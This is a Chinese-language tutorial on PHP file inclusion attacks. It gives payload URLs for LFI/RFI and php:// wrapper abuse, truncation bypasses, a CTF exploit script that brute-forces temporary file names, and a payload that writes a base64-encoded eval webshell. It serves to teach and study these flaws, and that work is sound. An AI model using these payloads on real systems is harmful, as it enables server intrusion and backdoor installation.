+<p>可以使用BurpSuite或Firefox的插件改变Firefox的User-Agent：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>再通过本地文件包含即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/LFI.php?file=../../../proc/self/environ</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：一般php是无法访问到/proc/self下的文件的，所以这种利用方式很难能用到。</p>
+</blockquote>
+<h3 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h3><h4 id="php-filter-string-strip-tags"><a href="#php-filter-string-strip-tags" class="headerlink" title="php://filter/string.strip_tags"></a>php://filter/string.strip_tags</h4><p>php7.0的bug</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>使用<code>php://filter/string.strip_tags</code>导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell</p>
+<p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line"></span><br><span class="line">• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line"></span><br><span class="line">• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>
+<h4 id="php-filter-convert-quoted-printable-encode"><a href="#php-filter-convert-quoted-printable-encode" class="headerlink" title="php://filter/convert.quoted-printable-encode"></a>php://filter/convert.quoted-printable-encode</h4><p>这个崩溃并不适用于include，require等函数，适用于file函数，file_get_contents函数，readfile函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• php7.0.0-7.0.32</span><br><span class="line"></span><br><span class="line">• php7.0.4-7.2.12</span><br><span class="line"></span><br><span class="line">• php&lt;=5.6.38的版本 (5.6.39-5.6.9以内的版本并不存在这个崩溃)</span><br></pre></td></tr></table></figure>
+<p>在包含的同时要给此存在文件包含的php文件post一个文件，然后用脚本去爆破这个文件即可。</p>
+<p>放一个xctf final的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;10.99.99.16&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force_tmp_files</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                            filename = i + j + k + l + m + n</span><br><span class="line">                            url = <span class="string">&quot;%s/index.php?function=extract&amp;file=/tmp/php%s&quot;</span> % (base_url, filename) <span class="comment">#url根据实际情况改下参数就行</span></span><br><span class="line">                            <span class="built_in">print</span> url</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                response = requests.get(url)</span><br><span class="line">                                <span class="keyword">if</span> <span class="string">&#x27;wwwwwwwwwwwwww&#x27;</span> <span class="keyword">in</span> response.content: <span class="comment">#可以利用burp 多线程上传文件  </span></span><br><span class="line">                                    <span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                                <span class="built_in">print</span> e</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    brute_force_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h4 id="自包含临时文件"><a href="#自包含临时文件" class="headerlink" title="自包含临时文件"></a>自包含临时文件</h4><p>利用条件：</p>
+<ul>
+<li><p>通过自包含或者其他方式使得临时文件暂时存在</p>
+</li>
+<li><p>能够同时查看phpinfo($_FILES[‘file’])</p>
+</li>
+<li><p>进行文件上传</p>
+</li>
+</ul>
+<p>也就是自己包含自己，比如index.php?file=index.php，这样也会生成临时文件，但是这样不够稳定，影响服务器性能，推荐前面两种方法。</p>
+<p>利用自包含index.php，页面不断加载，文件上传跳转后要求显示phpinfo页面，在文件上传的时候，php默认会在/tmp目录下随机生成 php+6位随机字母的文件，上传后跳转到自包含的页面,这时候在phpinfo中的$_FILES[‘file’]变量会显示临时文件路径，到另一个页面包含这个文件就能getshell。</p>
+<h3 id="本地文件包含的限制绕过"><a href="#本地文件包含的限制绕过" class="headerlink" title="本地文件包含的限制绕过"></a>本地文件包含的限制绕过</h3><h4 id="利用-00截断绕过后缀名限制"><a href="#利用-00截断绕过后缀名限制" class="headerlink" title="利用%00截断绕过后缀名限制"></a>利用%00截断绕过后缀名限制</h4><p>一般的Web引擎会限制包含文件的后缀名，例如上例<code>LFI1.php</code>中的包含指令，Web引擎会阻止后缀为<code>txt</code>的引用目标文件。<strong>PHP 5.3.4之前的版本在gpc关闭状态下</strong>，可以通过%00截断的方式绕过这一限制，触发本地文件包含漏洞。</p>
+<p>如，服务端脚本中含有以下代码的文件（LFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;./&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器访问路径：<code>http://hackroot.com/LFI.php?file=upload/test.txt%00</code>。触发本地包含漏洞。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/26/u7aS6UcCeRDwsQz.png" alt="image-20220126201324084"></p>
+<h4 id="利用超长字符截断绕过后缀名限制"><a href="#利用超长字符截断绕过后缀名限制" class="headerlink" title="利用超长字符截断绕过后缀名限制"></a>利用超长字符截断绕过后缀名限制</h4><p>我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。而利用”./“的方式即可构造出超长目录字符串:</p>
+<p>PHP 5.3.4之前的版本还可以利用Windows环境下“240个小数点”的方式进行截断，绕过后台的安全检测。</p>
+<p>如，服务端脚本中含有以下代码的文件（LFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;./&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器访问路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.14/LFI.php?file=./././././【中间省略n个./】././././././test.txt</span><br></pre></td></tr></table></figure>
+<p>触发本地包含漏洞。</p>
+<p>用到的不多，仅作为思路参考。</p>
+<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>在演示分析远程包含漏洞时，需要设置PHP引擎的以下前提条件：</p>
+<ul>
+<li>修改php.ini配置文件里面的<code>allow_url_fopen</code>和<code>allow_url_include</code>，使其开启<code>allow_url_fopen=On</code>和<code>allow_url_include=On</code>。</li>
+<li>被包含文件没有目录限制，或可控的文件、恶意代码、数据流可被引入解析。</li>
+</ul>
+<p>符合以上条件的就是远程文件包含漏洞。</p>
+<h3 id="普通远程文件包含"><a href="#普通远程文件包含" class="headerlink" title="普通远程文件包含"></a>普通远程文件包含</h3><p>如，服务端脚本中含有以下代码的文件（RFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传恶意代码（test.txt）到攻击者的服务端：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器访问路径：</p>
+<p><code>http://hackroot.com/RFI.php?file=http://192.168.1.14/test.txt</code>。触发远程包含漏洞。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/27/XJrSKxO9FYHgaZU.png" alt="image-20220127211653179"></p>
+<h3 id="远程文件包含的限制绕过"><a href="#远程文件包含的限制绕过" class="headerlink" title="远程文件包含的限制绕过"></a>远程文件包含的限制绕过</h3><h4 id="利用问号截断绕过后缀名限制"><a href="#利用问号截断绕过后缀名限制" class="headerlink" title="利用问号截断绕过后缀名限制"></a>利用问号截断绕过后缀名限制</h4><p>对于Web引擎会阻止后缀为txt的引用目标文件情况，可以通过?截断的方式，绕过安全检查。</p>
+<p>如，服务端脚本中含有以下代码的文件（RFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器访问路径：</p>
+<p><code>http://hackroot.com/RFI.php?file=http://192.168.1.14/test.txt?</code>。触发远程包含漏洞。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/28/nG3uyzNep1E9Wd7.png" alt="image-20220128224244493"></p>
+<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP封装协议又叫伪协议，此种类经常在CTF中用到，常用的封装协议有<code>php://input</code>、<code>php://zip</code>、<code>php://filter</code>、<code>php://zip</code>、<code>data://</code>、<code>zip://</code>、<code>file://</code>、<code>phar://</code>等。</p>
+<p>有的协议受限于<code>allow_url_include</code>，例如<code>file://</code>在<code>allow_url_fopen</code> 与 <code>allow_url_include</code>关闭的情况下都可以说使用，而 <code>data://</code>在<code>allwo_url_fopen</code> 与 <code>allow_url_include</code>都开启的情况下才可以使用。</p>
+<p>下图总结了部分PHP伪协议、版本与文件包含开关的对应关系：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>测试PHP版本</th>
+<th>allow_url_fopen</th>
+<th>allow_url_include</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file://</td>
+<td>&gt;=5.2</td>
+<td>Off/On</td>
+<td>Off/On</td>
+<td>?file=file://D:/www/code.txt</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>&gt;=5.2</td>
+<td>Off/On</td>
+<td>Off/On</td>
+<td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td>&gt;=5.2</td>
+<td>Off/On</td>
+<td>On</td>
+<td>?file=php://input 【POST DATA】\&lt;?php phpinfo();?&gt;</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td>&gt;=5.2</td>
+<td>Off/On</td>
+<td>Off/On</td>
+<td>?file=zip://D:/www/file.zip%23code.txt</td>
+</tr>
+<tr>
+<td>compress.bzip2://</td>
+<td>&gt;=5.2</td>
+<td>Off/On</td>
+<td>Off/On</td>
+<td>?file=compress.bzip2://D:/www/file.bz2</td>
+</tr>
+<tr>
+<td>compress.zlib://</td>
+<td>&gt;=5.2</td>
+<td>Off/On</td>
+<td>Off/On</td>
+<td>?file=compress.zlib://D:/www/file.gz</td>
+</tr>
+<tr>
+<td>phar://</td>
+<td>&gt;=5.3</td>
+<td>Off/On</td>
+<td>Off/On</td>
+<td>?file=phar://D:/www/file.zip/code.txt</td>
+</tr>
+<tr>
+<td>data://</td>
+<td>&gt;=5.2</td>
+<td>On</td>
+<td>On</td>
+<td>?file=data://text/plain,\&lt;?php phpinfo();?&gt;<br>【Or】<br>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<br>【也可以】<br>?file=data:text/plain,\&lt;?php phpinfo();?&gt;<br>【Or】<br>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>更多有关伪协议的信息可以参考官网：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
+<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a>data:// 协议</h3><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。</p>
+<p>如，服务端脚本中含有以下代码的文件（RFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过浏览器访问路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackroot.com/RFI.php?file=data:text/plain,%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure>
+<p>触发漏洞</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/28/6WaR9jDuY7bEC38.png" alt="image-20220128204428196"></p>
+<p>另外，也可以将payload编码成base64的形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackroot.com/RFI.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/28/aPnw2Oqi1eMVKBo.png" alt="image-20220128205217621"></p>
+<h3 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip:// 协议"></a>zip:// 协议</h3><p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
+<p>如，服务端脚本中含有以下代码的文件（RFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将 恶意文件（test.txt）压缩存储为 test.zip，通过浏览器访问路径：</p>
+<p><code>http://hackroot.com/RFI.php?file=zip://upload/test.zip%23test.txt</code></p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/eyHTVUF9pnj7kQI.png" alt="image-20220129162336562"></p>
+<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a>phar:// 协议</h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容。phar://<code>协议是在PHP 5.3.0后才开始启用的。这里仅对文件包含的角度对</code>phar://`协议进行利用，之后利用反序列化时会深入讲解。</p>
+<p>如，服务端脚本中含有以下代码的文件（RFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将 恶意文件（test.txt）压缩存储为 test.zip，通过浏览器访问路径：</p>
+<p><code>http://hackroot/RFI.php?file=phar://upload/test.zip/test.txt</code></p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/qmcniW6vbR5uQyF.png" alt="image-20220129161424371"></p>
+<h3 id="php-input-协议"><a href="#php-input-协议" class="headerlink" title="php://input 协议"></a>php://input 协议</h3><p><code>php://input</code>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为<code>php://input</code>，同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<blockquote>
+<p>注：当enctype=”multipart/form-data”时，php://input是无效的。</p>
+</blockquote>
+<p>如，服务端脚本中含有以下代码的文件（RFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过浏览器访问路径：<code>http://hackroot/RFI?file=php://input</code>，并发送POST数据（执行的代码），即可触发</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/28/ZmltI4vzDsBfxAi.png" alt="image-20220128230806186"></p>
+<h3 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h3><p><code>php://filte</code>是一种元封装器，是PHP中特有的协议流，设计用于数据流打开时的筛选过滤应用，作用是作为一个“中间流”来处理其他流。</p>
+<p>php://filter目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。</p>
+<p><strong>php://filter参数</strong></p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/28/x1lEIAsZePpj7HW.png" alt="image-20220128232804941"></p>
+<p><strong>可用的过滤器列表（4类）</strong></p>
+<p>此处列举主要的过滤器类型，详细内容请参考：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string.rot13</td>
+<td>等同于<code>str_rot13()</code>，rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td>string.strip_tags</td>
+<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mcrypt.*</td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td>mdecrypt.*</td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>zlib.deflate &amp; zlib.inflate</td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td>bzip2.compress &amp; bzip2.decompress</td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>使用<code>php://filter</code>协议读文件时是会解析php的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackroot.com/RFI.php?file=php://filter/resource=upload/test.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/28/UK8Si2gMZIsRdFv.png" alt="image-20220128234108611"></p>
+<p>要想读取php的源码，可以使用过滤器对读取到的内容进行编码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackroot.com/RFI.php?file=php://filter/read=convert.base64-encode/resource=LFI.php</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/28/3c2HkFrqoywRvJs.png" alt="image-20220128234727473"></p>
+<p>解码后就是源代码了</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/28/DAFQOS7gaiLbXoc.png" alt="image-20220128234828273"></p>
+<blockquote>
+<p>注：不仅仅是<code>include()</code>，<code>file_get_contents()</code>也可以使用<code>php://filter</code>读取文件。</p>
+</blockquote>
+<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>include()函数是不能使用<code>php://filter</code>，写文件的。但是<code>file_put_contents()</code>函数是可以写入文件的。测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">	file_put_contents(<span class="variable">$file</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackroot.com/file.php?file=php://filter/resource=test.txt&amp;txt=abc123</span><br></pre></td></tr></table></figure>
+<p>可以写入文件</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/VJEds7Hz6aWyIbR.png" alt="image-20220129001740208" style="zoom:50%;"></p>
+<p>如果写入的内容过长，可以先对其进行base64编码，在写入时使用<code>convert.base64-decode</code>进行解码。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackroot.com/file.php?file=php://filter/write=convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/w5tOsx1Ig2zmuPo.png" alt="image-20220129002134272" style="zoom:50%;"></p>
+<p>这里利用了过滤器写入了webshell，我们可以利用<code>php://filter</code>绕过“死亡exit”。</p>
+<h4 id="绕过file-put-contents“死亡exit”"><a href="#绕过file-put-contents“死亡exit”" class="headerlink" title="绕过file_put_contents“死亡exit”"></a>绕过file_put_contents“死亡exit”</h4><p>关于代码终结者<code>&lt;?php exit; ?&gt;</code>想必大家在打CTF或漏洞挖掘中写入shell的时候经常会遇到，在这样的情况下无论写入的shell是否成功都不会执行传入的恶意代码，因为在恶意代码执行之前程序就已经结束退出了，导致shell后门利用失败。</p>
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<blockquote>
+<p>有关绕过原理可以参考下面三篇大牛的文章，我仅仅总结下绕过姿势：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.cfyqy.com/article/13364c14.html">https://blog.cfyqy.com/article/13364c14.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510#h2-1">https://www.anquanke.com/post/id/202510#h2-1</a></li>
+</ul>
+</blockquote>
+<p>php的死亡绕过<code>file_put_content</code>大概有两种情形出现：</p>
+<ul>
+<li><code>file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</code></li>
+<li><code>file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</code></li>
+</ul>
+<blockquote>
+<p>还有一种是<code>file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</code>，不过这个是绕过杂糅代码，不是死亡exit，主要针对.htaccess文件做绕过，使用的方法不涉及伪协议，就不在这里做讨论了。</p>
+</blockquote>
+<h5 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h5><p>示例代码（f1.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h6 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h6><p>这里需要将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”，以补上一位就可以完全转化。</p>
